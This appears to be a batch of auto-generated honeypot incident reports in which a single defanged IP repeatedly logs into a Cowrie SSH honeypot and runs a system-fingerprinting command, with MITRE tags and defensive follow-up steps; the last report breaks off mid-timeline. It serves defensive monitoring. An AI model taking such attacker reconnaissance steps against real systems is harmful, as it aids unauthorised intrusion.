### 🔴 HIGH · IR-523150cafd63

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:03 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:03:36` | `cowrie.session.connect` |
| `2026-08-13 07:03:36` | `cowrie.client.version` |
| `2026-08-13 07:03:36` | `cowrie.client.kex` |
| `2026-08-13 07:03:37` | `cowrie.login.success` |
| `2026-08-13 07:03:38` | `cowrie.session.params` |
| `2026-08-13 07:03:38` | `cowrie.command.input` |
| `2026-08-13 07:03:38` | `cowrie.log.closed` |
| `2026-08-13 07:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a49e017a467

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:03 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:03:43` | `cowrie.session.connect` |
| `2026-08-13 07:03:43` | `cowrie.client.version` |
| `2026-08-13 07:03:43` | `cowrie.client.kex` |
| `2026-08-13 07:03:45` | `cowrie.login.success` |
| `2026-08-13 07:03:47` | `cowrie.session.params` |
| `2026-08-13 07:03:47` | `cowrie.command.input` |
| `2026-08-13 07:03:47` | `cowrie.log.closed` |
| `2026-08-13 07:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6993dfdebb0a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:03 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:03:50` | `cowrie.session.connect` |
| `2026-08-13 07:03:50` | `cowrie.client.version` |
| `2026-08-13 07:03:50` | `cowrie.client.kex` |
| `2026-08-13 07:03:51` | `cowrie.login.success` |
| `2026-08-13 07:03:53` | `cowrie.session.params` |
| `2026-08-13 07:03:53` | `cowrie.command.input` |
| `2026-08-13 07:03:53` | `cowrie.log.closed` |
| `2026-08-13 07:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-554cf1ce6aa8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:03 |
| **Last Seen** | 2026-08-13 07:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:03:57` | `cowrie.session.connect` |
| `2026-08-13 07:03:57` | `cowrie.client.version` |
| `2026-08-13 07:03:57` | `cowrie.client.kex` |
| `2026-08-13 07:03:58` | `cowrie.login.success` |
| `2026-08-13 07:03:59` | `cowrie.session.params` |
| `2026-08-13 07:03:59` | `cowrie.command.input` |
| `2026-08-13 07:04:00` | `cowrie.log.closed` |
| `2026-08-13 07:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0026a46a4e1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:04 |
| **Last Seen** | 2026-08-13 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:04:03` | `cowrie.session.connect` |
| `2026-08-13 07:04:03` | `cowrie.client.version` |
| `2026-08-13 07:04:03` | `cowrie.client.kex` |
| `2026-08-13 07:04:04` | `cowrie.login.success` |
| `2026-08-13 07:04:06` | `cowrie.session.params` |
| `2026-08-13 07:04:06` | `cowrie.command.input` |
| `2026-08-13 07:04:06` | `cowrie.log.closed` |
| `2026-08-13 07:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea5598712965

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:04 |
| **Last Seen** | 2026-08-13 07:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:04:09` | `cowrie.session.connect` |
| `2026-08-13 07:04:10` | `cowrie.client.version` |
| `2026-08-13 07:04:10` | `cowrie.client.kex` |
| `2026-08-13 07:04:11` | `cowrie.login.success` |
| `2026-08-13 07:04:13` | `cowrie.session.params` |
| `2026-08-13 07:04:13` | `cowrie.command.input` |
| `2026-08-13 07:04:13` | `cowrie.log.closed` |
| `2026-08-13 07:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a02ca244041a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:04 |
| **Last Seen** | 2026-08-13 07:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:04:16` | `cowrie.session.connect` |
| `2026-08-13 07:04:16` | `cowrie.client.version` |
| `2026-08-13 07:04:16` | `cowrie.client.kex` |
| `2026-08-13 07:04:18` | `cowrie.login.success` |
| `2026-08-13 07:04:20` | `cowrie.session.params` |
| `2026-08-13 07:04:20` | `cowrie.command.input` |
| `2026-08-13 07:04:20` | `cowrie.log.closed` |
| `2026-08-13 07:04:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-133dd2831bed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:04 |
| **Last Seen** | 2026-08-13 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:04:23` | `cowrie.session.connect` |
| `2026-08-13 07:04:23` | `cowrie.client.version` |
| `2026-08-13 07:04:23` | `cowrie.client.kex` |
| `2026-08-13 07:04:24` | `cowrie.login.success` |
| `2026-08-13 07:04:24` | `cowrie.session.params` |
| `2026-08-13 07:04:24` | `cowrie.command.input` |
| `2026-08-13 07:04:25` | `cowrie.log.closed` |
| `2026-08-13 07:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f8392450818

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:04 |
| **Last Seen** | 2026-08-13 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:04:29` | `cowrie.session.connect` |
| `2026-08-13 07:04:29` | `cowrie.client.version` |
| `2026-08-13 07:04:29` | `cowrie.client.kex` |
| `2026-08-13 07:04:30` | `cowrie.login.success` |
| `2026-08-13 07:04:31` | `cowrie.session.params` |
| `2026-08-13 07:04:31` | `cowrie.command.input` |
| `2026-08-13 07:04:31` | `cowrie.log.closed` |
| `2026-08-13 07:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f85461e7a2ab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:04 |
| **Last Seen** | 2026-08-13 07:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:04:36` | `cowrie.session.connect` |
| `2026-08-13 07:04:36` | `cowrie.client.version` |
| `2026-08-13 07:04:36` | `cowrie.client.kex` |
| `2026-08-13 07:04:37` | `cowrie.login.success` |
| `2026-08-13 07:04:39` | `cowrie.session.params` |
| `2026-08-13 07:04:39` | `cowrie.command.input` |
| `2026-08-13 07:04:40` | `cowrie.log.closed` |
| `2026-08-13 07:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35f54e7ba83a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:04 |
| **Last Seen** | 2026-08-13 07:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:04:42` | `cowrie.session.connect` |
| `2026-08-13 07:04:43` | `cowrie.client.version` |
| `2026-08-13 07:04:43` | `cowrie.client.kex` |
| `2026-08-13 07:04:44` | `cowrie.login.success` |
| `2026-08-13 07:04:45` | `cowrie.session.params` |
| `2026-08-13 07:04:45` | `cowrie.command.input` |
| `2026-08-13 07:04:45` | `cowrie.log.closed` |
| `2026-08-13 07:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e4f5b828cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:04 |
| **Last Seen** | 2026-08-13 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:04:50` | `cowrie.session.connect` |
| `2026-08-13 07:04:50` | `cowrie.client.version` |
| `2026-08-13 07:04:50` | `cowrie.client.kex` |
| `2026-08-13 07:04:50` | `cowrie.login.success` |
| `2026-08-13 07:04:51` | `cowrie.session.params` |
| `2026-08-13 07:04:51` | `cowrie.command.input` |
| `2026-08-13 07:04:52` | `cowrie.log.closed` |
| `2026-08-13 07:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df808141012

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:04 |
| **Last Seen** | 2026-08-13 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:04:56` | `cowrie.session.connect` |
| `2026-08-13 07:04:57` | `cowrie.client.version` |
| `2026-08-13 07:04:57` | `cowrie.client.kex` |
| `2026-08-13 07:04:58` | `cowrie.login.success` |
| `2026-08-13 07:04:59` | `cowrie.session.params` |
| `2026-08-13 07:04:59` | `cowrie.command.input` |
| `2026-08-13 07:04:59` | `cowrie.log.closed` |
| `2026-08-13 07:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99872393644

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:05 |
| **Last Seen** | 2026-08-13 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:05:03` | `cowrie.session.connect` |
| `2026-08-13 07:05:03` | `cowrie.client.version` |
| `2026-08-13 07:05:03` | `cowrie.client.kex` |
| `2026-08-13 07:05:05` | `cowrie.login.success` |
| `2026-08-13 07:05:06` | `cowrie.session.params` |
| `2026-08-13 07:05:06` | `cowrie.command.input` |
| `2026-08-13 07:05:06` | `cowrie.log.closed` |
| `2026-08-13 07:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d46ae17e5014

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:05 |
| **Last Seen** | 2026-08-13 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:05:09` | `cowrie.session.connect` |
| `2026-08-13 07:05:10` | `cowrie.client.version` |
| `2026-08-13 07:05:10` | `cowrie.client.kex` |
| `2026-08-13 07:05:11` | `cowrie.login.success` |
| `2026-08-13 07:05:12` | `cowrie.session.params` |
| `2026-08-13 07:05:12` | `cowrie.command.input` |
| `2026-08-13 07:05:13` | `cowrie.log.closed` |
| `2026-08-13 07:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a68439b25ac9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:05 |
| **Last Seen** | 2026-08-13 07:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:05:16` | `cowrie.session.connect` |
| `2026-08-13 07:05:16` | `cowrie.client.version` |
| `2026-08-13 07:05:17` | `cowrie.client.kex` |
| `2026-08-13 07:05:17` | `cowrie.login.success` |
| `2026-08-13 07:05:18` | `cowrie.session.params` |
| `2026-08-13 07:05:18` | `cowrie.command.input` |
| `2026-08-13 07:05:18` | `cowrie.log.closed` |
| `2026-08-13 07:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ade059c3bfa5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:05 |
| **Last Seen** | 2026-08-13 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:05:23` | `cowrie.session.connect` |
| `2026-08-13 07:05:23` | `cowrie.client.version` |
| `2026-08-13 07:05:23` | `cowrie.client.kex` |
| `2026-08-13 07:05:25` | `cowrie.login.success` |
| `2026-08-13 07:05:26` | `cowrie.session.params` |
| `2026-08-13 07:05:26` | `cowrie.command.input` |
| `2026-08-13 07:05:26` | `cowrie.log.closed` |
| `2026-08-13 07:05:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64f4c9797bcd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:05 |
| **Last Seen** | 2026-08-13 07:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:05:30` | `cowrie.session.connect` |
| `2026-08-13 07:05:30` | `cowrie.client.version` |
| `2026-08-13 07:05:30` | `cowrie.client.kex` |
| `2026-08-13 07:05:31` | `cowrie.login.success` |
| `2026-08-13 07:05:32` | `cowrie.session.params` |
| `2026-08-13 07:05:32` | `cowrie.command.input` |
| `2026-08-13 07:05:32` | `cowrie.log.closed` |
| `2026-08-13 07:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1613b17b3cac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:05 |
| **Last Seen** | 2026-08-13 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:05:36` | `cowrie.session.connect` |
| `2026-08-13 07:05:36` | `cowrie.client.version` |
| `2026-08-13 07:05:36` | `cowrie.client.kex` |
| `2026-08-13 07:05:38` | `cowrie.login.success` |
| `2026-08-13 07:05:39` | `cowrie.session.params` |
| `2026-08-13 07:05:39` | `cowrie.command.input` |
| `2026-08-13 07:05:39` | `cowrie.log.closed` |
| `2026-08-13 07:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3079e1d67f77

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:05 |
| **Last Seen** | 2026-08-13 07:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:05:42` | `cowrie.session.connect` |
| `2026-08-13 07:05:42` | `cowrie.client.version` |
| `2026-08-13 07:05:42` | `cowrie.client.kex` |
| `2026-08-13 07:05:44` | `cowrie.login.success` |
| `2026-08-13 07:05:45` | `cowrie.session.params` |
| `2026-08-13 07:05:45` | `cowrie.command.input` |
| `2026-08-13 07:05:45` | `cowrie.log.closed` |
| `2026-08-13 07:05:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b68ff501e487

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:05 |
| **Last Seen** | 2026-08-13 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:05:49` | `cowrie.session.connect` |
| `2026-08-13 07:05:49` | `cowrie.client.version` |
| `2026-08-13 07:05:49` | `cowrie.client.kex` |
| `2026-08-13 07:05:50` | `cowrie.login.success` |
| `2026-08-13 07:05:52` | `cowrie.session.params` |
| `2026-08-13 07:05:52` | `cowrie.command.input` |
| `2026-08-13 07:05:52` | `cowrie.log.closed` |
| `2026-08-13 07:05:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a505368ea9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:05 |
| **Last Seen** | 2026-08-13 07:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:05:56` | `cowrie.session.connect` |
| `2026-08-13 07:05:56` | `cowrie.client.version` |
| `2026-08-13 07:05:56` | `cowrie.client.kex` |
| `2026-08-13 07:05:57` | `cowrie.login.success` |
| `2026-08-13 07:05:58` | `cowrie.session.params` |
| `2026-08-13 07:05:58` | `cowrie.command.input` |
| `2026-08-13 07:05:58` | `cowrie.log.closed` |
| `2026-08-13 07:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-032010e909f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:06 |
| **Last Seen** | 2026-08-13 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:06:03` | `cowrie.session.connect` |
| `2026-08-13 07:06:03` | `cowrie.client.version` |
| `2026-08-13 07:06:03` | `cowrie.client.kex` |
| `2026-08-13 07:06:03` | `cowrie.login.success` |
| `2026-08-13 07:06:04` | `cowrie.session.params` |
| `2026-08-13 07:06:04` | `cowrie.command.input` |
| `2026-08-13 07:06:04` | `cowrie.log.closed` |
| `2026-08-13 07:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05840228c007

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:06 |
| **Last Seen** | 2026-08-13 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:06:09` | `cowrie.session.connect` |
| `2026-08-13 07:06:09` | `cowrie.client.version` |
| `2026-08-13 07:06:09` | `cowrie.client.kex` |
| `2026-08-13 07:06:10` | `cowrie.login.success` |
| `2026-08-13 07:06:11` | `cowrie.session.params` |
| `2026-08-13 07:06:11` | `cowrie.command.input` |
| `2026-08-13 07:06:11` | `cowrie.log.closed` |
| `2026-08-13 07:06:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e68dbc6ea478

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:06 |
| **Last Seen** | 2026-08-13 07:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:06:15` | `cowrie.session.connect` |
| `2026-08-13 07:06:16` | `cowrie.client.version` |
| `2026-08-13 07:06:16` | `cowrie.client.kex` |
| `2026-08-13 07:06:17` | `cowrie.login.success` |
| `2026-08-13 07:06:19` | `cowrie.session.params` |
| `2026-08-13 07:06:19` | `cowrie.command.input` |
| `2026-08-13 07:06:19` | `cowrie.log.closed` |
| `2026-08-13 07:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5f16f0c6a52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:06 |
| **Last Seen** | 2026-08-13 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:06:22` | `cowrie.session.connect` |
| `2026-08-13 07:06:22` | `cowrie.client.version` |
| `2026-08-13 07:06:22` | `cowrie.client.kex` |
| `2026-08-13 07:06:23` | `cowrie.login.success` |
| `2026-08-13 07:06:24` | `cowrie.session.params` |
| `2026-08-13 07:06:24` | `cowrie.command.input` |
